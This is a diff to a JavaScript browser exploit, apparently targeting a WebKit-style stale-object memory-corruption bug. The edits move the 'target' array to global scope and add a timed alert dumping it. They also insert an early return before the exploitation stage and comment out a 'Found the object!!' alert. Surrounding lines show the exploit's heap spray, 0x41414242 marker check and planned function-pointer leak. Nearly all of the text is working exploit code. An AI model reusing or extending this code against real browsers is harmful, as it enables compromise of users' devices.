@@ -10,6 +10,9 @@ var fc = new Function(trycatch);
 var fcp = 0;
 var smsh = new Uint32Array(0x10)
 
+var target = [];
+setTimeout(function(){alert("Target has been around for 10 minutes" + target)}, 10*60*1000);
+
 var mem0 = 0;
 var mem1 = 0;
 var mem2 = 0;
@@ -137,7 +140,7 @@ function go_() {
 		stale: {value: arr},
 		after: {value: 666}
 	};
-	var target = [];
+	
 	var before_len = arr.length;
 	Object.defineProperties(target, props);
 	stale = target.stale;
@@ -148,6 +151,7 @@ function go_() {
 		//alert("Exploit Failed");
 		document.location.reload();
 	}
+	return;
 	
 	stale[0] += 0x101;
 
@@ -162,7 +166,7 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
-				alert("Found the object!!");
+				//alert("Found the object!!");
 
 				// Leak function pointer
 				//stale[0] = fc;
